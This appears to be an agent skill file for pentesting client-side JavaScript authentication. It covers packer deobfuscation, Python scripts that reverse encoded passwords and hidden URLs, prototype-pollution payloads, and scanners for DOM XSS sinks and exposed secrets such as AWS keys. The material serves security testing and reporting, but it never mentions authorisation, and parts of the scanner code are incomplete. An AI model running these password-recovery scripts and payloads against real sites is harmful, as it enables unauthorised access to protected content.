---
name: client-auth-bypass
description: Reverse and bypass client-side JavaScript authentication — packed/obfuscated
  JS analysis, encoding algorithm reversal, batch password recovery, and pentest report
  writing.
category: red-teaming
version: 1.0.0
license: MIT
metadata:
  hermes_origin: import
tags:
- web
- pentest
- owasp
- client
- auth
- bypass
related_skills:
- client-reverse-engineering
- web-app-pentest
- browser-automation-security
---

# Client-Side Authentication Bypass

Use when pentesting a web app whose authentication (password check, access control) happens entirely in client-side JavaScript — `prompt()` dialogs, encoded/hashed comparison, and then redirects. Also use for Dean Edwards packer deobfuscation and Big5/legacy encoding sites.

## 1. Recon: Fetch everything

```bash
# Get the HTML page source — handle encoding!
curl -s "http://TARGET/" | iconv -f big5 -t utf-8 2>/dev/null

# If encoding unknown, save raw and inspect:
curl -s -L -o /tmp/page.html "http://TARGET/"
file /tmp/page.html
# Look for: <meta charset=...> or Content-Type header

# Fetch all JS files referenced in HTML
curl -s -L -o /tmp/index.js "http://TARGET/path/to/index.js"
```

**Pitfall**: Taiwanese/Chinese educational sites often use Big5 encoding. Always pipe through `iconv -f big5 -t utf-8` before grep. The raw curl output may look garbled — that's normal for Big5 without conversion.

## 2. Analyze the auth function

Look for patterns like:
- `onclick=checkPermitHome(...)` or `checkPermit(...)` in HTML
- `prompt('請輸入...')` — password prompt
- Encoded comparison: `if (iipw == ipw)` where `ipw` is a hardcoded parameter
- `window.open(url, ...)` — redirect on success

Extract all auth parameters from HTML:
```bash
curl -s "http://TARGET/" | grep -oP "checkPermitHome\('[^']*','[^']*',\"[^\"]*\"\)"
```

Each call has three parameters:
- `ipw`: comma-separated encoded password values
- `ipw_key`: numeric key used in encoding
- `iTag`: encoded target URL (semicolon-separated segments)

## 3. Deobfuscate packed JavaScript

Dean Edwards packer pattern:
```javascript
eval(function(p,a,c,k,e,d){...}(...))
```

**Key insight**: The packer uses `d[c.toString(a)]=k[c]||c.toString(a)`. When `k[c]` is an empty string `''`, it's falsy, so `d[key] = key.toString()` (the key string itself, e.g., `'3'`). This means some numeric tokens in the source STAY as their literal values — they are NOT replaced with empty strings.

**Decoding procedure**:
1. Parse the packer args: `p` (source), `a` (radix), `c` (count), `k` (token array), `e` (to-string function), `d` (initially empty)
2. Build the substitution table `d`:
   - `e=function(c){return c.toString(36)}` means indices are base-36 encoded in source
   - `e=function(c){return c}` means indices stay as-is
   - `d[c.toString(a)] = k[c] || c.toString(a)` — falsy k[c] fallback to index string
3. Apply substitutions to source, matching `\b\w+\b` patterns
4. Evaluate the result

**Example** — common encoding formula after deobfuscation:
```javascript
eniipw += (iipw.charCodeAt(u)
         + iipw.charCodeAt(u) * ipw_key.charAt(u)
         - 3 * ipw_key.charAt(u)) + ',';
```

## 4. Reverse the encoding algorithm

Once you have the formula, solve for the input character:

```
Given: encoded = charCode + charCode × keyDigit − 3 × keyDigit
Solve: charCode = (encoded + 3 × keyDigit) / (1 + keyDigit)
```

**Verification**: Always verify by re-encoding the recovered password and checking it matches the original `ipw`.

## 5. Decode the target URL

Common URL encoding pattern:
```javascript
ics = iTag.split(';');
icstr = '';
for (i=0; i<ics.length; i++) {
    if (/^(\\d+)\\.\\d(\\d+)$/.test(ics[i]))
        icstr += String.fromCharCode(RegExp.$1 - RegExp.$2 - 273);
}
```

Decoding each segment `AAA.BBB`:
```
charCode = AAA - BB - 273
```

**Note**: The regex `^(\\d+)\\.\\d(\\d+)$` splits "465.988" as:
- `RegExp.$1` = "465" (first digits)
- `RegExp.$2` = "88" (digits after the first post-dot digit "9")

**Python decoder**:
```python
import re

def decode_url(itag):
    segments = itag.split(';')
    url = ""
    for seg in segments:
        seg = seg.strip()
        if not seg:
            continue
        m = re.match(r'^(\d+)\.\d(\d+)$', seg)
        if m:
            char_code = int(m.group(1)) - int(m.group(2)) - 273
            # JavaScript String.fromCharCode does uint16 wrap
            url += chr(char_code & 0xFFFF)
    return url
```

## 5b. Partial deobfuscation nuance

In some cases (like this session), the Dean Edwards packer wraps only the **inner formulas**, while the main auth functions (`checkPermitHome`, `checkPermit`, `checkDL`) remain readable. Look for:

```javascript
function checkPermitHome(ipw,ipw_key,iTag) {
    iipw=''; if(ipw!='') iipw=prompt('...','');
    if(iipw!=null){
        if(/^[0-9a-zA-Z]+$/.test(iipw)){
            eniipw='';
            for(u=0;u<iipw.length;u++){
                // Packed formula here:
                eval(function(p,a,c,k,e,d){...}('6=6+(2.1(0)+2.1(0)*4.5(0)-3*4.5(0))+\\',\\';',...));
            }
            iipw=eniipw;
        }
    }
    if(iipw==ipw){
        // Packed URL decoder here:
        eval(function(p,a,c,k,e,d){...}('4=a.b(\\';\\');...',...));
        window.open(icstr+"?checkFromHomeIndex",'_top');
    }
}
```

**Strategy**: 
1. Identify the packed sub-expressions by searching for `eval(function(p,a,c,k,e,d)`
2. Deobfuscate only those snippets (not the whole file)
3. The readable wrapper reveals the **control flow** and **parameter names**, making the deobfuscated formula context clear
## 6. Batch processing pattern

```python
import re

def decode_password(ipw_str, key_str):
    ipw = [int(x) for x in ipw_str.rstrip(',').split(',')]
    pwd = ""
    for encoded, key_char in zip(ipw, key_str):
        key_digit = int(key_char)
        char_code = (encoded + 3 * key_digit) // (1 + key_digit)
        pwd += chr(char_code)
    return pwd

def decode_url(itag):
    segments = itag.split(';')
    url = ""
    for seg in segments:
        seg = seg.strip()
        if not seg:
            continue
        m = re.match(r'^(\d+)\.\d(\d+)$', seg)
        if m:
            char_code = int(m.group(1)) - int(m.group(2)) - 273
            url += chr(char_code)
    return url
```

## 7. Pentest report structure

When asked for a report, produce a professional markdown document covering:

1. **基本資訊**: target, date, methodology (灰箱/黑箱/白箱)
2. **執行摘要**: high-level findings, risk rating
3. **弱點詳情**: per-vulnerability breakdown with CVSS, OWASP mapping, CWE, PoC
4. **攻擊實證**: cracked passwords table, attack script
5. **風險矩陣**: severity × exploitability matrix
6. **修復建議**: 短期/中期/長期 phased remediation

**Template elements**:
- Tables for credentials, vulnerability details
- CVSS 3.1 scoring reference
- OWASP Top 10 (2021) and CWE mappings
- Appendix with encoding algorithm documentation
- Disclaimer statement

## Pitfalls

- **Big5 encoding**: Taiwanese sites often use Big5, not UTF-8. Always `iconv` before parsing.
- **Packer edge cases**: Empty strings in the `k` array become literal index values in `d`, not empty strings. This causes `3*4.5(0)` to stay as `3*ipw_key.charAt(u)` (keeping the `3`), not become `*ipw_key.charAt(u)`.
- **Regex in packer**: `$1`, `$2` in packed code — the `$` is NOT a `\w` character, so the packer does NOT try to substitute it. The `1` and `2` after `$` DO get substituted (but with identity mappings like d['1']='1'), preserving the original `RegExp.$1` syntax.
- **Integer division**: When reversing encoding, use integer division `//` since charCodes are integers.
- **Client-side only**: If the auth check is `if (iipw == ipw)` entirely in JS, there is NO server validation. This is the vulnerability itself — document it clearly.

## Extended: Client-Side Vulnerability Discovery

### 8. Prototype Pollution Detection

JavaScript prototype pollution allows attackers to inject properties into Object.prototype, affecting all objects:

```python
# Test for prototype pollution via URL params / JSON merge
PROTOTYPE_POLLUTION_PAYLOADS = [
    '__proto__[isAdmin]=true',
    '__proto__.isAdmin=true',
    'constructor[prototype][isAdmin]=true',
    '__proto__[admin]=1',
    'constructor.prototype.isAdmin=true',
]

# Server-side check (if Node.js)
def test_prototype_pollution(url: str, param: str):
    """Test if parameter is vulnerable to prototype pollution."""
    payloads = [
        f'{param}[__proto__][polluted]=true',
        f'{param}[constructor][prototype][polluted]=true',
        f'{param}.__proto__.polluted=true',
    ]
    for payload in payloads:
        # Try in query string
        r = requests.get(url, params={param: json.dumps({"__proto__": {"polluted": "true"}})})
        # Check for any signs of successful pollution
        # (Often requires specific gadget knowledge for the target)
```

### 9. CSRF Token Analysis

```python
def analyze_csrf_protection(url: str, session: requests.Session = None) -> dict:
    """Analyze CSRF token implementation."""
    s = session or requests.Session()
    r = s.get(url)
    
    findings = {}
    
    # Check for CSRF token in HTML
    token_patterns = [
        r'name="csrf[^"]*" value="([^"]+)"',
        r'name="_token" value="([^"]+)"',
        r'name="authenticity_token" value="([^"]+)"',
        r'name="csrfmiddlewaretoken" value="([^"]+)"',
        r'<meta name="csrf[^"]*" content="([^"]+)"',
    ]
    
    for pattern in token_patterns:
        match = re.search(pattern, r.text, re.I)
        if match:
            findings['token_found'] = match.group(1)[:50]
            findings['token_pattern'] = pattern
            break
    
    # Check CORS headers
    cors_headers = ['Access-Control-Allow-Origin', 'Access-Control-Allow-Credentials']
    for header in cors_headers:
        if header in r.headers:
            findings[header] = r.headers[header]
    
    # Check SameSite cookie attribute
    for cookie in s.cookies:
        findings[f'cookie_{cookie.name}_samesite'] = getattr(cookie, '_rest', {}).get('samesite', 'not set')
    
    # Test if token is validated server-side
    # Submit with empty/missing token
    findings['validates_token'] = 'unknown'  # needs manual testing
    
    return findings
```

### 10. Client-Side XSS via DOM Analysis

```python
def discover_dom_xss(js_code: str) -> list:
    """Analyze JavaScript for DOM XSS vulnerabilities."""
    
    # Sources (user-controllable input)
    sources = [
        'location', 'location.href', 'location.hash', 'location.search',
        'document.URL', 'document.documentURI', 'document.referrer',
        'window.name', 'postMessage', 'localStorage.getItem',
        'sessionStorage.getItem', 'document.cookie',
    ]
    
    # Sinks (dangerous output functions)
    sinks = [
        'innerHTML', 'outerHTML', 'document.write(', 'document.writeln(',
        'eval(', 'setTimeout(', 'setInterval(', 'new Function(',
        'location.href=', 'location.replace(', 'location.assign(',
        'document.createElement', 'jQuery.html(', 'jQuery.append(',
        'jQuery.prepend(', 'jQuery.after(', 'jQuery.before(',
        'jQuery.replaceWith(', 'React.createElement', 'dangerouslySetInnerHTML',
        'v-html=',  # Vue
        '[innerHTML]=',  # Angular
    ]
    
    findings = []
    lines = js_code.split('\n')
    
    for i, line in enumerate(lines):
        for source in sources:
            if source in line:
                for sink in sinks:
                    if sink in line:
                        findings.append({
                            'line': i + 1,
                            'code': line.strip()[:200],
                            'source': source,
                            'sink': sink,
                            'severity': 'high' if 'eval' in sink else 'medium',
                        })
    
    return findings
```

### 11. WebSocket Data Extraction

```python
def extract_websocket_auth(js_code: str) -> list:
    """Find WebSocket connections and auth patterns in JS."""
    patterns = [
        r'new WebSocket\(["\']([^"\']+)["\']',
        r'ws:\/\/[^\s"\'<>]+',
        r'wss:\/\/[^\s"\'<>]+',
    ]
    
    endpoints = []
    for pattern in patterns:
        matches = re.findall(pattern, js_code, re.I)
        endpoints.extend(matches)
    
    return list(set(endpoints))
```

### 12. Hidden Admin/Role Escalation in JS

```python
def find_role_checks(js_code: str) -> list:
    """Find client-side role/permission checks that can be bypassed."""
    patterns = [
        # Role-based checks
        r'role\s*[=!]==?\s*["\']admin["\']',
        r'isAdmin\s*[=!]==?\s*true',
        r'isAuthenticated\s*[=!]==?\s*true',
        r'user\.role\s*[=!]==?\s*["\'](?:admin|super)["\']',
        r'permissions?\.(?:includes|indexOf)\(',
        r'can(?:Access|Edit|Delete|View)',
        # Feature flags
        r'featureFlags?\s*[=!]==?\s*',
        r'enable(?:d)?Features?\s*[=!]==?\s*',
    ]
    
    findings = []
    lines = js_code.split('\n')
    
    for i, line in enumerate(lines):
        for pattern in patterns:
            if re.search(pattern, line, re.I):
                # Extract surrounding context
                start = max(0, i - 3)
                end = min(len(lines), i + 4)
                context = '\n'.join(f'  {j+1}: {lines[j].strip()[:150]}' 
                                   for j in range(start, end))
                findings.append({
                    'line': i + 1,
                    'code': line.strip()[:200],
                    'pattern': pattern,
                    'context': context,
                })
    
    return findings
```

### 13. API Key / Token Discovery in Client-Side Code

```python
def find_exposed_secrets(js_code: str) -> list:
    """Find API keys, tokens, and secrets exposed in client-side JS."""
    secret_patterns = [
        # API keys
        r'(?:api[_-]?key|apikey|api_secret|apiSecret)\s*[:=]\s*["\']([^"\']{8,})["\']',
        # Tokens
        r'(?:token|accessToken|refreshToken|bearer)\s*[:=]\s*["\']([^"\']{8,})["\']',
        # Secrets
        r'(?:secret|privateKey|clientSecret)\s*[:=]\s*["\']([^"\']{8,})["\']',
        # Endpoints with auth
        r'(?:https?://[^\s"\'<>]*?)(?:api_key|token|auth)=([^&\s"\'<>]+)',
        # Firebase / Supabase keys
        r'(?:firebaseConfig|supabaseKey)\s*=\s*\{[^}]*\}',
        # AWS keys (dangerous!)
        r'AKIA[0-9A-Z]{16}',
        r'(?:aws_access_key_id|aws_secret_access_key)\s*[:=]\s*["\']([^"\']+)["\']',
    ]
    
    findings = []
    for pattern in secret_patterns:
        matches = re.findall(pattern, js_code, re.I)
        for match in matches:
            findings.append({
                'pattern': pattern,
                'match': match[:100] if isinstance(match, str) else str(match)[:100],
                'severity': 'critical' if 'AKIA' in str(match) or 'secret' in pattern else 'high',
            })
    
    return findings
```

### 14. Source Map Analysis

```python
def check_source_maps(base_url: str) -> dict:
    """Check if source maps are exposed (reveals original source code)."""
    results = {}
    
    # 1. Check for sourcemap comment at end of JS files
    r = requests.get(f'{base_url}/static/js/main.js')
    if 'sourceMappingURL' in r.text:
        sourcemap_url = re.search(r'sourceMappingURL=(\S+)', r.text)
        if sourcemap_url:
            results['main_js_sourcemap'] = sourcemap_url.group(1)
    
    # 2. Try common sourcemap paths
    common_paths = [
        '/static/js/main.js.map',
        '/static/js/bundle.js.map',
        '/js/app.js.map',
        '/assets/index.js.map',
    ]
    
    for path in common_paths:
        r = requests.head(f'{base_url}{path}')
        if r.status_code == 200:
            results[path] = 'exposed'
    
    # 3. If source maps found, they can be reversed to recover original source
    if results:
        results['action'] = 'Use source-map-extractor or similar tool to recover original source'
    
    return results
```

### 15. WebAssembly Analysis

```python
def analyze_wasm(wasm_url: str) -> dict:
    """Analyze WebAssembly binary for security-relevant patterns."""
    import requests
    
    r = requests.get(wasm_url)
    wasm_bytes = r.content
    
    findings = {
        'size': len(wasm_bytes),
        'has_magic': wasm_bytes[:4] == b'\x00asm',
    }
    
    # Extract strings from WASM
    import re
    strings = re.findall(b'[\x20-\x7e]{4,}', wasm_bytes)
    interesting = [s.decode() for s in strings if any(
        kw in s.lower() for kw in [b'key', b'secret', b'token', b'auth', b'encrypt', b'decrypt', b'flag']
    )]
    
    findings['interesting_strings'] = interesting[:50]
    
    # Check for imported functions (reveals WASM capabilities)
    if b'env' in wasm_bytes[:1000] or b'wasi' in wasm_bytes[:1000]:
        findings['runtime'] = 'WASI/browser'
    
    return findings
```
